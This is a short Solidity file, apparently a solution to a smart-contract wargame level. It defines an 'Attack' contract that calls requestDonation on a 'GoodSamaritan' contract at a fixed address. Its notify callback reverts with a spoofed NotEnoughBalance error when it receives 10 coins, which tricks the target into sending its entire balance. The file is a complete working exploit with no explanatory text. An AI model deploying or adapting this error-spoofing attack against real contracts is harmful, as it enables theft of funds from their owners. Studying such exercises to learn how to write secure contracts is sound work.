// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

interface GoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

interface Coin { 
    function transfer(address dest_, uint256 amount_) external;
}

contract Attack {

    address goodSamaritanAddress =0xd761C753Fd4dae45e86aB9B25ba556c3cD201199;
    GoodSamaritan goodSamaritan = GoodSamaritan(goodSamaritanAddress);

    error NotEnoughBalance();

    function notify(uint256 amount) external{
        if(amount == 10){   
            revert NotEnoughBalance();
        }    
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }
}
